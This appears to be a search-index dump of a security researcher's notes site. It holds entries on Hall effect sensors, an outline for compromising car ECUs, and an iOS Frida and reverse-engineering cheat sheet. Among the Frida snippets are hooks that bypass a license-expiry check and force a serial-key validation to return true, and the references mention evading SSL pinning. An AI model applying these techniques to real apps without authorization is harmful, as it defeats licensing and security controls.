        "content": "Hall Effect Sensors can be used to produce ON/OFF signals or modulated square wave. It\u0026rsquo;s a type of DC Digital Sensors in DC Signals.\nHall Effect Sensors are electronic switches, that react to magnetic fields, to rapidly control the flow of current or voltage ON and OFF. It is assembled of epoxy filled non-magnetic housing, containing a hall element, a magnet, and a trigger wheel.\nThe Hall element is a thin, non-magnetic plate which is electrically conductive. Electron flow is equal on both side of the plate.\nSince everything between the magnet and the hall element is non-magnetic, the magnet (or magnetic field) has no effect on the current flow.\nHall Sensor Disassembly If a solid area or other trigger device approaches the sensor, a magnetic field is created between the magnet and the disk. This magnetic field cause the electron flow to stop on one side of the plate, and continue to flow on the other side.\nThe Hall Sensor Signal is a measurement of the voltage drop between the two sides of the plate. When the magnetic field increases, the voltage \u0026ldquo;drop\u0026rdquo; across the two sides of the plate increases. High voltage on one side, low voltage on the other. The signal output from the sensor is High.\nAs the disc moves away from the sensor, the magnetic field weakens and is lost. This loss produces very little voltage drop across the plate sides.The signal output is Low.\nA rapid switching of the voltage ON/OFF produces a HIGH/LOW signal that the Control Module uses to recognize speed and position.\nTypical Application of Hall Effect Sensors Crankshaft Sensors Camshaft Sensors Motor Position and Speed Sensors (e.g. Window Motor, Sunroof Motor) \u0026hellip; ", 
        "url": "\/hall-effect-sensors\/"
    },
    
    
    
    "\/how-to-compromise-ecu\/": {
        
        "title": "How to compromise ECU",
        "tags": [],
        "content": "Five steps to compromise ECU:\nRemote access Access to in-vehicle network Bridge domain boundaries Access to target ECU Manipulate ECU or vehicle behavior Find more info about Car Hacking on notes.\n", 
        "url": "\/how-to-compromise-ecu\/"
    },
    
    
    
    "\/how-to-write-notes\/": {
        
        "title": "How to write Notes",
        "tags": [],
        "content": " Use Markdown for everything, stand-alone deployment Use shortcodes, and develop custom ones Note: shortcodes are commented-out Note: correct syntax is {{\u0026lt;..\u0026gt;}} (no spaces between {} \u0026amp; \u0026lt;\u0026gt;) Clear and consistent, easy to implement new features Including Images To include images, copy the image to /content/posts/images/*. Then when you want to include it, use either of:\n# =\u0026gt; like this ![Image Caption](/posts/images/image-of-choice.png) # =\u0026gt; or {{ \u0026lt; imgcap title=\u0026#34;Image Caption\u0026#34; src=\u0026#34;/posts/images/image-of-choice.png\u0026#34; \u0026gt; }} The folder images in content/posts is created to index those files/images in the final build or deploy, and therefore removes the overhead of the Hugo processing. Some more documentation on Hugo website.\nIncluding Files To include files of any type, ready to be downloaded, copy the file to /content/posts/files/*. Then include it in your post as instructed below:\n[File to Download](/posts/files/some_file_to_download-example.pdf) The folder /content/posts/files is used to serve and index those files in the final build/deploy.\nMarkdown Styled Blocks\n::: alert red This is a **Red Alert!** Take cover. ::: Typical Insertions\nUse \u0026gt; to quote in markdown block\n\u0026gt; For I know the plans I have for you, declares the LORD, plans to prosper you and not to harm you, plans to give you hope and a future. - Jeremiah 29:11 Wikipedia Insertion\nYou can either use named parameters:\n{{ \u0026lt; wikipedia tag=\u0026#34;VIC_cipher\u0026#34; \u0026gt; }} {{ \u0026lt; wikipedia tag=\u0026#34;VIC_cipher\u0026#34; lang=\u0026#34;fr\u0026#34; \u0026gt; }} {{ \u0026lt; wikipedia tag=\u0026#34;VIC_cipher\u0026#34; lang=\u0026#34;fr\u0026#34; title=\u0026#34;\u0026#34; \u0026gt; }} {{ \u0026lt; wikipedia tag=\u0026#34;VIC_cipher\u0026#34; title=\u0026#34;VIC Cipher\u0026#34; \u0026gt; }} {{ \u0026lt; wikipedia tag=\u0026#34;VIC_cipher\u0026#34; lang=\u0026#34;en\u0026#34; title=\u0026#34;VIC Cipher\u0026#34; \u0026gt; }} Inserting FontAwesome Icons\n# =\u0026gt; in markdown (md) ## Some of my photos :fa-camera-retro: Highlight lines in code\nList of supported languages\n# =\u0026gt; xml {{ \u0026lt; highlight xml \u0026#34;linenos=table, linenostart=11, hl_lines=1 3\u0026#34;\u0026gt; }} \u0026lt;category blog=\u0026#34;posts\u0026#34;\u0026gt; \u0026lt;label xml:lang=\u0026#34;en\u0026#34; text=\u0026#34;Article\u0026#34; /\u0026gt; \u0026lt;/category\u0026gt; {{ \u0026lt; /highlight \u0026gt; }} # =\u0026gt; go {{ \u0026lt; highlight go \u0026#34;linenos=table,hl_lines=8 15-17,linenostart=199\u0026#34; \u0026gt; }} // ... code {{ \u0026lt; / highlight \u0026gt; }} # =\u0026gt; go - specific lines go { linenos=table,hl_lines=[8,\u0026#34;15-17\u0026#34;],linenostart=199 } // ... code Reference a link\n{{ \u0026lt; ref /blog \u0026gt; }} Shortcodes Caption images via this shortcode\n\u0026lt;span class=\u0026#34;caption-wrapper\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;caption\u0026#34; src=\u0026#34;/images/2016/thetheme/1.png\u0026#34; title=\u0026#34;Sample caption\u0026#34; alt=\u0026#34;Sample caption\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;caption-text\u0026#34;\u0026gt;Sample caption\u0026lt;/span\u0026gt; \u0026lt;/span\u0026gt; {{ \u0026lt; imgcap title=\u0026#34;Sample caption\u0026#34; src=\u0026#34;/images/2016/thetheme/1.png\u0026#34; \u0026gt; }} Insert Gist or GitHub Repository\n{{ \u0026lt; gist duraki 78985452 \u0026gt; }} # ... or ... {{ \u0026lt; github repo=\u0026#34;duraki/notes\u0026#34; file=\u0026#34;/path/to/file\u0026#34; lang=\u0026#34;language\u0026#34; options=\u0026#34;highlight-options\u0026#34; \u0026gt;}} Insert Instagram Image\n# =\u0026gt; https://www.instagram.com/p/BWNjjyYFxVx/ # =\u0026gt; Normal Instagram view {{ \u0026lt; instagram BWNjjyYFxVx \u0026gt; }} # =\u0026gt; Hide caption {{ \u0026lt; instagram BWNjjyYFxVx hidecaption \u0026gt; }} Insert a Tweet in post\n# =\u0026gt; https://twitter.com/SanDiegoZoo/status/1453110110599868418 {{ \u0026lt; tweet user=\u0026#34;SanDiegoZoo\u0026#34; id=\u0026#34;1453110110599868418\u0026#34; \u0026gt; }} Hide Something\n{{ \u0026lt; details \u0026gt; }} This website is provided for free educational purposes. Knowledge shared here can be used for personal gain and experience. {{ \u0026lt; /details \u0026gt; }} {{ \u0026lt; details \u0026#34;Read More\u0026#34; \u0026gt; }} Note: Some \u0026lt;read more\u0026gt; note for further details, or hidden image/text/component. {{ \u0026lt; /details \u0026gt; }} More shortcodes on official website.\nDeploy Check details of README.md to learn how to deploy ~notes on local and remote machines.\n", 
        "url": "\/how-to-write-notes\/"
    },
    
    
    
    "\/posts\/images\/": {
        
        "title": "Images",
        "tags": [],
        "content": "", 
        "url": "\/posts\/images\/"
    },
    
    
    
    "\/ios-frida-scripting\/": {
        
        "title": "iOS Frida Scripting",
        "tags": [],
        "content": "Before start, make sure you follow all of the typical iOS Reverse Engineering processes, as well as how to use lldb more professionally. The below Frida snippets will greatly increase your binary instrumentation knowledge.\nCheck if Objective-C Runtime is available\nif (ObjC.available) { ... } Get Process ID (PID)\nProcess.id Get Process current Thread ID\nProcess.getCurrentThreadId() List all Classes\n// Iterate through all classes Object.keys(ObjC.classes).forEach(function (className) { ... }); // Iterate through all classes via for-loop for (var className in ObjC.classes) { if (ObjC.classes.hasOwnProperty(className)) { ... } } // Iterate without filtering ObjC.enumerateLoadedClassesSync(); // Iterate with filtering ObjC.enumerateLoadedClassesSync({ \u0026#34;ownedBy: someModule\u0026#34; }); // Count number of classes Object.keys(ObjC.classes).length; List all Protocols\n// Iterate through all protocols Object.keys(ObjC.protocols).forEach(function (protocol) { ... }); // Iterate through all protocols via for-loop for (var protocolName in ObjC.protocols) { if (ObjC.protocols.hasOwnProperty(protocolName)) { ... } } // Count number of protocols Object.keys(ObjC.protocols).length; Enumerate Modules\n# Find Modules via Frida Process.enumerateModules() // Print all loaded Modules Process.findModuleByName(\u0026#34;Reachability\u0026#34;) // Find Module by Absolute Module name Process.findModuleByName(\u0026#34;libboringssl.dylib\u0026#34;) // Find Module by name, displays the information Process.findModuleByAddress(\u0026#34;0x1c1c4645c\u0026#34;) // Find Module by address, displays the information # Find Address and Module of an export function name DebugSymbol.fromAddress(Module.findExportByName(null, \u0026#39;strstr\u0026#39;)) # Find Address of Export, and use Address to find Module Module.findExportByName(null, \u0026#39;strstr\u0026#39;) // \u0026#34;0x183cb81e8\u0026#34; Module.getExportByName(null,\u0026#39;strstr\u0026#39;)\t// \u0026#34;0x183cb81e8\u0026#34; Process.findModuleByAddress(\u0026#34;0x183cb81e8\u0026#34;) # Exports inside a Module modules = Process.findModuleByName(\u0026#34;Reachability\u0026#34;) modules.enumerateExports() Memory Manipulation\nMemory.allocUtf8String(\u0026#34;Hello\u0026#34;) // 0x1067ec510 Memory.readUtf8String(\u0026#34;0x1067ec510\u0026#34;) // Hello ptr(0x1067ec510).readUtf8String(2)\t// He pointerToCString = new NativePointer(ptr(0x1067ec510)) // 0x1067ec510 console.log(pointerToCString.readCString(4)) // Hell Instance Methods and Static Methods\nObjC.classes.SomeClass.$ownMethods; // Class Static Methods ObjC.classes.SomeClass.$ivars; // Class Instance Variables ObjC.classes.NSUUID.alloc().init()\t// 4645BFD2-94EE-413D-9CE5-8982D41ED6AE ObjC.classes.NSString.stringWithString_(\u0026#34;Howdy\u0026#34;)\t// isKindOfClass(ObjC.classes.NSString) = true Instance and Class kind\nObjC.classes.NSDate.date().$kind; // \u0026#34;instance\u0026#34; ObjC.classes.NSDate.$kind; // \u0026#34;class\u0026#34; ObjC.classes.NSDate.$class.$kind; // \u0026#34;meta-class\u0026#34; Construct an Object from pointer\n// NSString * str = [NSString stringWithUTF8String: \u0026#34;Badger\u0026#34;]; var str = new ObjC.Object(\u0026#34;0xPTRVAL\u0026#34;); str.toString(); // \u0026#34;badger\u0026#34; Working with ArrayBuffer in Frida\nThe ArrayBuffer type in Frida does not have a .length property, only .byteLength. If you want to access individual bytes on the ArrayBuffer object, you must declare Uint8Array first, and fill it with individual values.\nvar data = new ObjC.Object(obj.$ivars.exampleNSDataVar); var arrayBuffer = data.bytes().readByteArray(data.length()); // \u0026lt;101a08be 1000ce0a ...\u0026gt; /** arrayBuffer instaceof [object ArrayBuffer] */ var arrayBufInt = new Uint8Array(arrayBuffer); var arrayBufString = \u0026#34;\u0026#34;; for (var i = 0; i \u0026lt; arrayBufInt.length; i++) { arrayBufString += (arrayBufInt[i].toString(16) + \u0026#34; \u0026#34;); } console.log(arrayBufString); // 10 1a 08 be 10 00 ce 0a ... Construct an NSString\nvar NSString = ObjC.classes.NSString; NSString.stringWithUTF8String_(Memory.allocUtf8String(\u0026#34;Hello\u0026#34;)); // Hello NSString.stringByAppendingString_(\u0026#34;World\u0026#34;); // Hello World Conversion of NSString to NSData\nvar str = ObjC.classes.NSString.stringWithString_(\u0026#34;Foo\u0026#34;); var data = ObjC.classes.NSData; data = str.dataUsingEncoding_(1)\t// NSASCIIStringEncoding = 1, NSUTF8StringEncoding = 4 console.log(data)\t// \u0026lt;666f6f\u0026gt; since, foo to hex equals to \u0026#39;666f6f\u0026#39; Conversion of NSData to NSString\nvar data = ObjC.classes.NSData; // alloc + init = \u0026lt;666f6f\u0026gt; var byteHex = data.CKHexString() // array of NSData bytes as hex string // byteHex.$className = NSTaggedPointerString var str = ObjC.classes.NSString.stringWithUTF8String_[byteHex.bytes] Construct an NSMutableDictionary\nvar dict = ObjC.classes.NSMutableDictionary.alloc.init(); var key = \u0026#34;ExampleKey\u0026#34;; var value = \u0026#34;ExampleValue\u0026#34;; dict.setObject_forKey_(value, key); // [\u0026#34;ExampleKey\u0026#34;, \u0026#34;ExampleValu\u0026#34;] Object Superclass and Class\nvar str = ObjC.classes.NSString.stringWithString_(\u0026#34;hello\u0026#34;); str.superclass().toString(); // \u0026#34;NSString\u0026#34; str.class().toString(); // \u0026#34;NSTaggedPointerString\u0026#34; ObjC.classes.NSDate.$super.$ClassName // \u0026#34;NSObject\u0026#34; ObjC.classes.NSObject.$super // \u0026#34;null\u0026#34; Retrieve Modules by ObjC class\nObjC.classes.NSString.$moduleName # /System/Library/Frameworks/Foundation.framework/... ObjC.classes.NSString.stringWithString_(\u0026#34;badger\u0026#34;).$moduleName # /System/Library/Frameworks/CoreFoundation.framework/... Using Interceptor to monitor File Open\n// Find Export of targeted function var fileHandler = Module.findExportByName(\u0026#34;libsystem_kernel.dylib\u0026#34;, \u0026#34;open\u0026#34;); Interceptor.attach(fileHandler, { onEnter: function (args) { const path = Memory.readUtf8String(this.context.x0); // x0 = register console.log(\u0026#34;[*] libsystem_kernel.dylib (open)\u0026#34;, path); } }); Serialize an Object to JSON\nJSON.parse(JSON.stringify(ObjC.classes.NSObject)) Implement a void(*) method override\n// Example, a method checks if the user license is expired, and exits early in subroutine of it\u0026#39;s function block // - void(*) [AppDelegate checkUserLicenseExpired] var appDelegateImpl = ObjC.classes.AppDelegate[\u0026#39;- checkUserLicenseExpired\u0026#39;]; appDelegateImpl.implementation = ObjC.implement(appDelegateImpl, function() { var licensed = ptr(0x1); return; // returns from the overriden function block }); // console.log(\u0026#34;completed implementation replace mod\u0026#34;) Intercept a Method and Examine the data passed and returned\n// Example, a method does mathematical calculations, and you want to see what happens during the execution, // you also want to know value of arguments passed, therefore // - (bool) [UserLicenseRegistration validateSerialKey:withEmail:] var licenseReg = ObjC.classes.UserLicenseRegistration[\u0026#39;- validateSerialKey:withEmail:\u0026#39;]; Interceptor.attach(licenseReg.implementation, { /** Important */ // Do remember that in Objective-C runtime, and the way the language works (ie. by sending Message to a Selector), // the first two (2) arguments of any implementation method is fixed on the stack, and they are referencing to // // #arg0 -\u0026gt;\t1st Argument -\u0026gt;\tSelf\t// the first argument is always pointer of self() // #arg1 -\u0026gt; 2nd Argument -\u0026gt;\tMsg Selector // the second argument is always pointer pointing to message selector, ie. a method called // // Therefore, it is not needed to examine these two arguments during any analysis phase. /** [onEnter description] */ onEnter(args) { var serialKey = ObjC.Object(args[2]) // as seen, as of 2nd parameter, we are getting real data of the method argument value var withEmail = ObjC.Object(args[3]) // as declared by method signature, this is last argument console.log(hexdump(serialKey)); } /** [onLeave description] */ // This callback event is fired whenever the app is leaving the method onLeave(retval) { var hooking_return_val = ptr(0x1);\t// will be BOOL(true) retval.replace(hooking_return_val);\t// replace original retval with our variable console.log(\u0026#34;\\t [*] New Return Value: \u0026#34; + hooking_return_val); // boom :) bypassed serial key } }); Creating a Block (Handler)\nThe following will define an Objective-C Block, that will be passed as a handler parameter to +[UIAlertAction actionWithTitle:style:handler:]. One important thing when creating Blocks is to respect the original block handler signature, as the blocks are methods on their own. Blocks are typically executed in async thread.\n/** [Block description] */ /** * Define a Block handler, as per Apple\u0026#39;s documentation and their signature references. * @param {[type]} { retType: \u0026#39;void\u0026#39;, argTypes: [\u0026#39;object\u0026#39;], implementation( [description] */ const handler = new ObjC.Block({ retType: \u0026#39;void\u0026#39;, argTypes: [\u0026#39;object\u0026#39;], implementation() { } }); // and then to use it; const dismissAction = alertaction.actionWithTitle_style_handler_(\u0026#39;Dismiss\u0026#39;, 1, handler); this.alerthook.addAction_(dismissAction); Creating a new Object instance\n\u0026hellip; via allocation of class, and calling its constructor\nvar instance = ObjC.classes.ClassName.alloc().init() \u0026hellip; via already allocated instance, directly visible on the Heap\nvar instances = ObjC.choose(ObjC.classes.ClassName)\t// multiple instances may be shown var instance = ObjC.chooseSync(ObjC.classes.ClassName)[0] // selecting a single instance from the heap \u0026hellip; via instance singleton, if class supports instance property\n# Get a Signleton of the Class var instance = ObjC.classes.SingletonClass.getInstance().myInterestingInstance() # Call the method on the Signleton instance instance.setSomething() instance.getSomething() instance.doSomeTask() # You may also pass an argument, if the method accepts it (ie. `- setSomething:`) instance.setSomething_(argument) // make sure to use \u0026#34;_\u0026#34; instead of Objective-C\u0026#39;s \u0026#34;:\u0026#34; separator Enumerating Type of the Method Arguments and Return Type\nThis is great trick when you are lacking real RE environment, and you must know what Types are accepted. Luckly, Frida plays nice in such cases.\n\u0026hellip; to get Argument Types of a Class/Object Method\nObjC.classes.UIView[\u0026#39;- addSubview:\u0026#39;].argumentTypes [ \u0026#34;pointer\u0026#34;, \u0026#34;pointer\u0026#34;, \u0026#34;pointer\u0026#34; ] \u0026hellip; to get Return Type of a Class/Object Method\nObjC.classes.UIView[\u0026#39;- addSubview:\u0026#39;].returnType \u0026#34;void\u0026#34; \u0026hellip; to get low-level encoding of Types (Internal ObjC)\nObjC.classes.UIView[\u0026#39;- addSubview:\u0026#39;].types \u0026#34;v24@0:8@16\u0026#34; Declare a variable outside of callback scope\nWhen writing larger scripts, or when the target attack surface is large, you can use this. to explicitly note that the variable is scoped to the stack at which the execution started. Otherwise, the local variables can\u0026rsquo;t be reused in other callbacks (such is onEnter() and onLeave()).\nInterceptor.attach((...).implementation, { onEnter: (...) { var callback_local = \u0026#34;Foo\u0026#34; this.stack_global = \u0026#34;Bar\u0026#34; }, onLeave: (...) { // console.log(callback_local) // will result in error, undefined \u0026#39;callback_local\u0026#39; console.log(this.stack_global) // will print Bar } }) Allocate and initialise a NativeFunction\n// Obtain a pointer to a \u0026#39;malloc\u0026#39; function from the actual library var mallocPtr = Module.findExportByName(\u0026#34;libsystem_c.dylib\u0026#34;, \u0026#34;malloc\u0026#34;); // Define a NativeFunction w/ \u0026#39;malloc\u0026#39; signature, accepting (int)size and // returning (pointer)addr of allocated memory space var malloc = new NativeFunction(mallocPtr, \u0026#34;pointer\u0026#34;, [\u0026#34;int\u0026#34;]); Interceptor.replace(mallocPtr, new NativeCallback(function(size) { var ptrAddr = malloc(size); console.log(\u0026#34;[*] Allocated via \u0026#39;malloc\u0026#39; \u0026#34; + size + \u0026#34; bytes in \u0026#34; + ptrAddr); return ptrAddr; }, \u0026#39;pointer\u0026#39;, [\u0026#39;int\u0026#39;])); # [*] Allocated via \u0026#39;malloc\u0026#39; 29 bytes in 0x1d4032680 # ... Viewing and Modifying Registers\nvar addr = ObjC.classes[\u0026#34;ClassName\u0026#34;][\u0026#34;MethodName\u0026#34;].implementation; Interceptor.attach(addr, { onEnter: function (args) { /** this.context is a method describing current context thread, */ /** from with in app. process. as such, one can use it to get */ /** more details about the thread/page on the heap. here, we */ /** use it to pull registers from the procmap. */ // Print all registers console.log(JSON.stringify(this.context, null, 4), \u0026#39;\\n\u0026#39;); # \u0026#34;pc\u0026#34;: \u0026#34;0x102d91d34\u0026#34;, # \u0026#34;sp\u0026#34;: \u0026#34;0x16d3f42d0\u0026#34;, # \u0026#34;x0\u0026#34;: \u0026#34;0x2831e8a80\u0026#34;, # \u0026#34;x1\u0026#34;: \u0026#34;0x1e43ee192\u0026#34;, # ... // Print a register value console.log(\u0026#34;Register (x14): \u0026#34;, this.context.x14); // reg(x14) = 0x18 console.log(\u0026#34;Register (x14): \u0026#34;, this.context.x14.toInt32()); // reg(x14) = 24 // Modify a register value this.context.x14 = 63; // reg(x14) = 0x44 this.context.x14 = 0x44; // reg(x14) = 63 } }); Viewing Opcode Instructions at Memory Address\nvar addr = ObjC.classes[\u0026#34;ClassName\u0026#34;][\u0026#34;MethodName\u0026#34;].implementation; Instruction.parse(addr); // mov x1, x2 Instruction.parse(addr).mnemonic; // mov Instruction.parse(addr).opStr; // x1, x2 Modifying Opcode Instruction at Memory Address\nvar addr = ObjC.classes[\u0026#34;ClassName\u0026#34;][\u0026#34;MethodName\u0026#34;].implementation; var addrToOverwrite = addr.add(0x0c); console.log(addr, Instruction.parse(addrToOverwrite)); // add x0, x0 Memory.patchCode(addrToOverwrite, 4, code =\u0026gt; { const cs = new Arm64Writer(code, { pc: code }); cs.putNop(); cs.flush(); }); console.log(addr, Instruction.parse(addrToOverwrite)); // nop Additional options for hexdump\nThis small keyword allows you do dump anything residing at specific memory address, native functions, pointer or any other blob data.\nconsole.log(hexdump(ptr(this.data))\t// dumps this.data in a hexadecimal forma, with default opts console.log(hexdump(ptr(this.data), {\t// dumps this.data but with specific display opts length: 1000,\t/* max number of chars in hexview */ header: true,\t/* also include table header */ ansi: true /* display in ansi */ })) Using Frida scripting to hook on the Module, and Exports\nInterceptor.attach(Module.findExportByName(null, \u0026#39;tls_record_encrypt\u0026#39;), { onEnter: function (args) { // ... } }) Using Frida scripting to hook on the NSURLSession completionHandler\nThe below snippet is an example on how to utiliese Frida scripting engine, and override the completion handler or a block. The parameters, data, and request will be displayed first, and after that, the original completion handler will continue.\nstored = null /* a variable that will store/contain original completionHandler block */ Interceptor.attach(ObjC.classes.NSURLSession[\u0026#34;- dataTaskWithRequest:completionHandler:\u0026#34;].implementation, { // Hook on NSURLSession*completionHandler onEnter: function (args) { this.object_selector = \u0026#34;-[NSURLSession dataTaskWithRequest:completionHandler:]\u0026#34; console.log(\u0026#34;onEnter -- \u0026#34; + this.title) requestObj = ObjC.Object(args[2]) // args[2] is dataTaskWithRequest:* value console.log(\u0026#34;Request \u0026#34; + requestObj) completionHandler = new ObjC.Block(args[3]) // store the original completion handler stored = completionHandler.implementation /* (re)use completionHandler method implementation */ completionHandler.implementation = function (data, response, error) { // the block shall respect original implementation // print completionHandler Network Response console.log(\u0026#34;Response: \u0026#34; + requestObj) console.log(ObjC.Object(response)) // Getting ahold of data dat = ObjC.Object(data) // \u0026#39;data\u0026#39; is an NSData object datLen = dat.length() // Length of \u0026#39;data\u0026#39; from the completion datBytes = dat.bytes() // Get the data in bytes // Displaying data console.log(hexdump(dat, {ansi:true, length:len})) # alternative: # console.log(Memory.readUtf8String(dat)) // Call original completion block return stored(data, response, error) } } , onLeave: function (retval) { console.log(\u0026#34;onLeave -- \u0026#34; + this.title) } }) Using Frida to register a new Objective-C class\nconst FridaObjC_ClassRegister = ObjC.registerClass({ name: \u0026#34;PseudoNewClass\u0026#34;, //super: ObjC.classes.AppAbstractClass, // you can extend Apps class //protocols: [ObjC.protocols.PBMessage], // you can implement an App Protocol Class methods: { \u0026#39;- init\u0026#39;: function() { const self = this.super.init(); if (self != null) { console.log(this.name + \u0026#34; is registered and loaded.\u0026#34;); } return self; }, \u0026#39;- dealloc\u0026#39;: function() { ObjC.unbind(this.self); // free the instance this.super.dealloc(); // clear the ARC }, // \u0026#39;- callSomeMethod\u0026#39; : function () {} } }); const proxy = FridaObjC_ClassRegister.alloc().init(); proxy.callSomeMethod(); // call a class method console.log(proxy.$ownMembers); // log the output proxy.release(); // release the allocated class Frida Swift Scripts Using Frida Interceptor with mangled Swift functions\ntodo: add Swift/Frida Scripting examples\ntry { var targetFunction_ptr = Module.findExportByName(\u0026#34;MyAppModule\u0026#34;, \u0026#34;$s9YDAppModule17ConfigC33publicKeyVerifyCertsSayypGvpfi\u0026#34;); if (targetFunction_ptr == null) { throw \u0026#34;[*] Target Function not found\u0026#34;; } Interceptor.attach(targetFunction_ptr, { onLeave: function (retval) { var array = new ObjC.Object(retval); console.log(\u0026#34;[*] ObjC Class Type: \\t\u0026#34;, array.$className); return retval; } }); } catch (err) { console.log(\u0026#34;[!] Exception: \u0026#34; + err.message); } } Frida ObjC Runtime Definition Frida Objective-C Variable Types\n# https://github.com/frida/frida-objc-bridge/blob/main/test/basics.m#L965 # \u0026#34;test(\u0026#39;char\u0026#39;, 127);\u0026#34; # \u0026#34;test(\u0026#39;char\u0026#39;, -128);\u0026#34; # \u0026#34;test(\u0026#39;int\u0026#39;, -467);\u0026#34; # \u0026#34;test(\u0026#39;int\u0026#39;, 150);\u0026#34; # \u0026#34;test(\u0026#39;short\u0026#39;, -56);\u0026#34; # \u0026#34;test(\u0026#39;short\u0026#39;, 562);\u0026#34; # \u0026#34;test(\u0026#39;long\u0026#39;, 0x7fffffff);\u0026#34; # ... Frida Objective-C Defined Properties\n# https://opensource.apple.com/source/objc4/objc4-551.1/runtime/objc-runtime-new.h.auto.html # class specifications meta-class // metaclass exists for each class /* Reason for existance of meta-class */ /** Operations performed directly from class objects, such as calling static */ /** member functions, do not belong to an instance, so they need to exist in */ /** the class type. When the class itself is subclassed (setSuperClass), the */ /** parent class is not equivalent to the class to which it belongs (isa != superclass) */ /** Similarly, constructing a class requires providing its \u0026#39;isa\u0026#39;. */ super-class // parent class root-class // root class selector // selector is stored as a string, its memory location corresponds to the method, one by one imp // ordinary function pointer id // generic data type # objc_reflection /* What is reflection? */ /** Objective-C is a reflective language, meaning it can obtain and modify its */ /** own state at runtime. The implementation of it exists in the \u0026#39;libobjc.A.dylib\u0026#39; */ /** These runtime capabilities come from the more flexible objc class structure */ /** organization, and it provides an interface for manipulating its own struct */ /** At the same time, there are _OBJC sections in the Mach-O executable file; */ /** These sections provide sufficient class composition, and debuggers can parse */ /** these structures, making it really fun to RE. */ LC_SEGMENT.__OBJC.__cat_cls_meth LC_SEGMENT.__OBJC.__cat_inst_meth LC_SEGMENT.__OBJC.__string_object LC_SEGMENT.__OBJC.__cstring_object LC_SEGMENT.__OBJC.__message_refs LC_SEGMENT.__OBJC.__sel_fixup LC_SEGMENT.__OBJC.__cls_refs LC_SEGMENT.__OBJC.__class LC_SEGMENT.__OBJC.__meta_class LC_SEGMENT.__OBJC.__cls_meth LC_SEGMENT.__OBJC.__inst_meth LC_SEGMENT.__OBJC.__protocol LC_SEGMENT.__OBJC.__category LC_SEGMENT.__OBJC.__class_vars LC_SEGMENT.__OBJC.__instance_vars LC_SEGMENT.__OBJC.__module_info LC_SEGMENT.__OBJC.__symbols # https://github.com/frida/frida-objc-bridge/blob/main/index.js#L62 ObjC.available ObjC.api ObjC.classes ObjC.protocols ObjC.Object ObjC.Protocol ObjC.Block ObjC.mainQueue ObjC.registerProxy ObjC.registerClass ObjC.registerProtocol ObjC.bind ObjC.unbind ObjC.getBoundData ObjC.enumerateLoadedClasses ObjC.enumerateLoadedClassesSync ObjC.choose ObjC.chooseSync ObjC.enumerateLoadedClasses ObjC.enumerateLoadedClasses ObjC.enumerateLoadedClasses # https://github.com/frida/frida-objc-bridge/blob/main/index.js#L224 registryBuiltins = [ prototype constructor hasOwnProperty toJSON toString valueOf ] # https://github.com/frida/frida-objc-bridge/blob/main/index.js#L428 objCObjectBuiltins = [ prototype constructor handle hasOwnProperty toJSON toString valueOf equals $kind $super $superClass $class $className $moduleName $protocols $methods $ownMethods $ivars ] # https://github.com/frida/frida-objc-bridge/blob/main/index.js#L1110 objCIvarsBuiltins = [ prototype constructor hasOwnProperty toJSON toString valueOf ] References Crypto Hooks via Frida Scripting Using Frida Scripting to hijack NSURLSession - doing so, you avoid SSL pins, web proxy, mitm attacks frida-objc-bridge tests frida-ios-intercept-api ", 
        "url": "\/ios-frida-scripting\/"
    },
    
    
    
    "\/ios-reverse-engineering\/": {
        
        "title": "iOS Reverse Engineering",
        "tags": [],
        "content": "Restart SpringBoard if iPhone crashed\n$ killall SpringBoard $ killall -SIGSEGV SpringBoard ^ // Safe Mode Print iOS Logs from Terminal\n$ tail -f /var/log/syslog Using class-dump, or dsdump\n$ class-dump -S -s -H App -o /path/to/headers/App/ // old way $ dsdump App // new way Install offloaded *IPA files\n# requires: # brew install libimobiledevice # brew install ideviceinstaller $ ideviceinstaller -i \u0026lt;path_to_ipa_file\u0026gt; frida-server¬†crashing on iPhone device\nIf your frida-server is crashing on the iPhone test device, you can try to:\nReset frida-server on test device (requires gawk): # from your \u0026#34;iPhone:\u0026#34; device, such is via SSH tunnel $ apt install gawk $ FRIDA_PID=$(ps aux | grep frida-server | grep -v grep | awk \u0026#39;{print $2}\u0026#39;); kill -9 $FRIDA_PID; frida-server -l 0.0.0.0 Inject Frida Gadget in the iOS app. and engage from non-jailbroken iDevice Upgrade to latest Frida version Memory modification on Jailed iPhone devices\nipa-medit is a memory search and patch tool for resigned *ipa without jailbreaking. It supports iOS apps running on iPhone and Apple Silicon Mac. It was created for mobile game security testing. Many mobile games have jailbreak detection, but ipa-medit does not require jailbreaking, so memory modification can be done without bypassing the jailbreak detection. Similar tool exists for Android named apk-medit. The target .ipa file must be signed with a certificate installed on your computer. If you want to modify memory on third-party applications, please use a tool such as ipautil for re-signing.\nUsage:\n# =\u0026gt; using iPhone requirs you to provide executable file path from *ipa and the Bundle ID $ unzip SomeGame.ipa $ ipa-medit -bin=\u0026#34;./Payload/SomeGame.ipa/SomeGame\u0026#34; -id=\u0026#34;com.durakiconsulting.game\u0026#34; Commands:\n# find Search the specified integer on memory. # By default, only Integer types are search when targeting iOS apps running on iPhone \u0026gt; find 999986 \u0026gt; find [string|word|dword|qword] 999994 # Success to halt process # Scanning: 0x00000001025e4000-0x00000001025e8000 # ... # Found: 1!! # Address: 0x10a2feea0 # filter Filter previous search results that match the current search results. \u0026gt; filter 999842 # patch Write the specified value on the address found by search. \u0026gt; patch 10 # attach Attach to the target process. \u0026gt; atach # detach Detach from the attached process. \u0026gt; detach # ps Get information about the target process. It will only work if you are targeting an iOS app running on an iPhone. \u0026gt; ps # SBProcess: pid = 926, state = running, threads = 37, executable = tap1000000 # State: Running # thread #1: tid = 0x545ee, 0x00000001bd6552d0 libsystem_kernel.dylib`mach_msg_trap + 8, queue = \u0026#39;com.apple.main-thread\u0026#39; ... # exit Exit ipa-medit (shortcut: Ctrl-D). \u0026gt; exit Use official documentation to read troubleshooting guide.\nCommon iOS RE tools\nClassDumpRuntime - create human readable interfaces from ObjC runtime SwiftDump - extract Swift Object from Mach-O file, supports Swift 5 \u0026hellip; commonly for debugging\n$ brew install lldb \u0026hellip; commonly for hooking\nCydia Substrate Theos \u0026hellip; via *Cydia and apt-get* (non-jailed)\nCydia: - OpenSSH, OpenSSL - tcpdump # https://mcapollo.github.io/Public/ - python, pip # https://mcapollo.github.io/Public/ - AppSync # https://cydia.akemi.ai/?page/net.angelxwind.appsyncunified - Cycript # https://cydia.saurik.com/package/cycript/ - Apple File Conduit # https://cydia.saurik.com/package/com.saurik.afc2d/ - syslog # https://cydia.saurik.com/package/syslogd/ apt-get - adv-cmds (finger, fingerd, lsvfs, last, md, ps) - 